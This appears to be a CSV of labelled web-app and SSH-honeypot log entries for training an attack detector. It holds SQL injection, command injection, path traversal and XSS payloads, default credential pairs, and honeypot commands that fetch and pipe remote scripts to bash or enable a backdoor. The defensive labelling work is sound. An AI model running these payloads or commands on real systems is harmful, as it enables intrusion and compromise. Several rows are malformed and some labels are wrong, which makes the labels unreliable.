text,label
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+OR+1%3d1+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:SQLi ip:203.108.84.82 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+1=CONVERT(int,@@version)--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:SQLi ip:185.28.117.56 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1%3bINSERT+INTO+users(user,password)+VALUES('h4x','h4x')--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:LOGIN ip:192.168.244.137 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.login.success ip:192.168.51.177 username:nginx password:raspberry command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.session.connect ip:116.123.155.242 username:- password:- command:- request:-,RECON-COWRIE
"source:DVWA event:LOGIN ip:10.64.172.148 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.login.success ip:192.168.244.137 username:root password:guest command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:exit request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.failed ip:91.64.34.71 username:mongodb password:changeme command:- request:-,BRUTE_FORCE_SSH-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- request:- command:ls,SSH_COMMAND-COWRIE
"source:DVWA event:RECON ip:103.103.174.171 username:- password:- command:- request:""GET /dvwa/vulnerabilities/exec/?ip=127.0.0.1%3bcat+/etc/passwd&Submit=Submit HTTP/1.1""",CMD_INJECTION-DVWA
source:cowrie event:cowrie.login.failed ip:172.19.4.172 username:elastic password:toor command:- request:-,BRUTE_FORCE_SSH-COWRIE
"source:DVWA event:SQLi ip:10.176.219.222 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli_blind/?id=1+AND+sleep(3)--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.login.failed ip:185.241.27.214 username:test password:hello request:-,BRUTE_FORCE_SSH-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:chmod +x bot.sh request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:192.168.244.137 command:- password:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:LOGIN ip:45.205.180.198 username:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.login.failed ip:45.190.138.55 username:guest password:welcome1 command:- request:-,BRUTE_FORCE_SSH-COWRIE
source:cowrie event:cowrie.command.input ip:91.149.18.204 username:- password:- command:nmap -sV 192.168.1.0/24 request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:45.155.181.235 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:LOGIN ip:185.41.202.3 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.login.success ip:103.83.105.127 username:ftp password:dragon command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.login.success ip:203.198.41.44 username:uucp password:trustno1 command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.login.failed ip:192.168.244.137 username:root password:root command:- request:-,BRUTE_FORCE_SSH-COWRIE
source:cowrie ip:45.45.67.201 event:cowrie.login.failed username:admin password:dragon request:-,BRUTE_FORCE_SSH-COWRIE
"source:DVWA event:RECON ip:45.126.92.169 username:- password:- command:- request:""GET /dvwa/vulnerabilities/fi/?page=..%2f..%2fproc%2fself%2fcmdline HTTP/1.1""",CMD_INJECTION-DVWA
"event:LOGIN ip:10.209.147.45 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:LOGIN ip:10.48.192.22 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:LOGIN ip:203.227.227.181 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.login.success ip:203.94.35.157 username:postgres password:hello command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:LOGIN ip:103.188.12.17 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:SQLi ip:185.225.70.112 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+1=2+UNION+SELECT+table_name,null+FROM+information_schema.tables--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.login.success ip:10.20.54.140 username:oracle password:welcome1 command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.login.failed ip:91.173.90.212 username:nobody password:abc123 command:- request:-,BRUTE_FORCE_SSH-COWRIE
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+1%3d1+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:SQLi ip:10.234.65.204 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=0+UNION+ALL+SELECT+NULL,NULL,NULL--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.login.success ip:192.168.97.105 username:sync password:default command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.login.success ip:192.168.13.216 username:tomcat password:default command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.command.input ip:91.19.144.52 username:- password:- command:ls -la /root request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:echo '#!/bin/sh' > back.sh request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:103.237.250.20 username:- password:- command:rpm -qa request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:192.168.244.137 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:SQLi ip:203.204.207.187 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=0+UNION+ALL+SELECT+NULL,NULL,NULL--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:203.29.57.124 password:- -la command:ls /etc request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:185.15.178.224 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:SQLi ip:10.37.182.70 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+EXTRACTVALUE(1,CONCAT(0x7e,version()))--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:SQLi ip:45.64.251.215 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+@@datadir,@@basedir--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:LOGIN ip:203.135.81.241 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input username:- password:- command:ls ~/.ssh request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:192.168.162.114 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+sleep(5)--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:SQLi ip:185.7.249.46 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+ORDER+BY+3--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:172.25.176.128 username:- password:- command:set request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+user%28%29%2cversion%28%29+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
event:cowrie.command.input ip:192.168.244.137 username:- password:- command:find /var -name '*.log' request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:10.37.18.136 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:45.221.55.11 username:- password:- command:yum install -y nc request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+OR+a%3da&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:LOGIN ip:45.206.133.74 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:SQLi ip:192.168.118.177 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+(SELECT+COUNT(*)+FROM+users)>0--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:45.198.79.2 username:- password:- command:nmap -O 192.168.1.1 request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.failed ip:103.141.151.48 username:postgres password:password123 command:- request:-,BRUTE_FORCE_SSH-COWRIE
"source:DVWA event:SQLi ip:10.111.101.151 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli_blind/?id=1+AND+1=1--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.login.failed ip:103.105.92.202 username:deploy password:pass@123 command:- request:-,BRUTE_FORCE_SSH-COWRIE
source:cowrie event:cowrie.login.success ip:192.168.244.137 username:root password:guest command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/xss_r/?name=%3cvideo+src%3dx+onerror%3dalert%281%29%3e HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:91.97.20.233 username:- password:- command:curl -fsSL bash http://get.docker.com request:-,SSH_COMMAND-COWRIE
"source:DVWA ip:203.230.154.131 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+user(),version()--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:45.87.12.253 username:- password:- command:nmap -sV 192.168.1.0/24 request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:91.26.12.227 password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1;SELECT+*+FROM+users--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:ps aux request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.success ip:203.25.232.89 username:sshd password:jessica command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.command.input ip:91.184.244.94 username:- password:- command:wget http://malware.com/bot.sh request:-,SSH_COMMAND-COWRIE
"source:DVWA event:RECON ip:103.49.243.218 username:- password:- command:- request:""GET /dvwa/vulnerabilities/fi/?page=..%2f..%2fproc%2fself%2fenviron HTTP/1.1""",RECON-DVWA
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/xss_r/?name=%3cimg+src%3dx+onerror%3dalert%281%29%3e HTTP/1.1""",SQLI-DVWA
event:cowrie.command.input source:cowrie ip:91.198.198.53 username:- password:- +x shell.py request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.success ip:91.155.21.136 username:ftpuser password:hello command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:chmod +x back.sh request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.success ip:192.168.215.73 username:deploy password:guest command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:LOGIN ip:192.168.244.137 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie ip:91.51.142.102 event:cowrie.login.success username:apache password:abc123 request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:LOGIN ip:192.168.244.137 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+OR+1%3d1&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:LOGIN ip:10.80.11.188 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:LOGIN ip:91.216.17.20 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:RECON ip:103.130.26.88 username:- password:- command:- request:""GET /dvwa/setup.php HTTP/1.1""",RECON-DVWA
source:cowrie event:cowrie.login.failed ip:192.168.244.137 username:admin password:admin command:- request:-,BRUTE_FORCE_SSH-COWRIE
source:cowrie event:cowrie.login.success ip:192.168.91.21 username:ftpuser password:test command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:SQLi ip:103.79.251.64 username:- password:- command:- /dvwa/vulnerabilities/sqli/?id='+WAITFOR+DELAY+'0:0:5'--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+OR+1%3d1+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:203.226.138.160 username:- password:- command:set request:-,SSH_COMMAND-COWRIE
"source:DVWA event:RECON ip:45.21.247.18 username:- password:- command:- request:""GET /dvwa/vulnerabilities/fi/?page=..%2f..%2fetc%2fhosts HTTP/1.1""",RECON-DVWA
"source:DVWA event:LOGIN ip:10.177.46.180 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:exit request:-,SSH_COMMAND-COWRIE
"source:DVWA ip:192.168.244.137 username:- password:- command:- request:""POST HTTP/1.1"" /dvwa/login.php",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:netstat -a request:-,SSH_COMMAND-COWRIE
"event:SQLi source:DVWA ip:103.114.110.245 username:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+1=CONVERT(int,@@version)--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:LOGIN ip:192.168.244.137 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:SQLi ip:172.29.118.219 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+INTO+OUTFILE+'/var/www/html/shell.php'--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:103.140.87.140 username:- password:- command:systemctl enable backdoor request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/xss_r/?name=%3cvideo+src%3dx+onerror%3dalert%281%29%3e",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:exit request:-,SSH_COMMAND-COWRIE
"source:DVWA event:RECON ip:91.154.205.122 username:- password:- command:- request:""GET /dvwa/vulnerabilities/fi/?page=..%2f..%2fvar%2flog%2fauth.log HTTP/1.1""",RECON-DVWA
source:cowrie event:cowrie.login.failed ip:192.168.227.249 username:bin password:123123 command:- request:-,BRUTE_FORCE_SSH-COWRIE
source:cowrie event:cowrie.login.failed ip:192.168.161.137 password:test username:ansible command:- request:-,BRUTE_FORCE_SSH-COWRIE
"source:DVWA event:LOGIN ip:45.250.103.205 username:- password:- command:- request:""POST HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.login.success ip:172.25.181.35 username:deploy password:1234 command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:LOGIN ip:203.147.100.57 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:185.235.221.49 username:- password:- command:systemctl enable backdoor request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:192.168.244.137 username:- password:- request:""POST command:- /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:LOGIN ip:10.176.247.240 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.login.success ip:10.52.189.3 username:www-data command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:SQLi ip:91.233.91.208 command:- username:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+1=2+UNION+SELECT+table_name,null+FROM+information_schema.tables--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:203.194.76.139 username:- password:- command:cat /etc/crontab request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input username:- password:- command:exit request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:45.42.152.241 username:- password:- command:curl -s http://192.168.1.100/payload | bash request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+ORDER+BY+3+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:10.82.144.185 username:- password:- command:chmod 777 /tmp/bot request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.success ip:91.248.36.3 username:etcd command:- password:welcome,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.login.failed ip:185.105.254.95 username:games password:secret command:- request:-,BRUTE_FORCE_SSH-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.142.250 username:- password:- command:ls -la / request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:103.169.26.31 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:cat /etc/resolv.conf request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:91.249.71.68 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:LOGIN ip:192.168.244.137 username:- command:- password:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.login.failed ip:185.79.88.20 username:rabbitmq password:admin@123 command:- request:-,BRUTE_FORCE_SSH-COWRIE
"source:DVWA event:RECON ip:10.172.248.206 username:- password:- command:- request:""GET /dvwa/vulnerabilities/exec/?ip=127.0.0.1%3bid&Submit=Submit HTTP/1.1""",CMD_INJECTION-DVWA
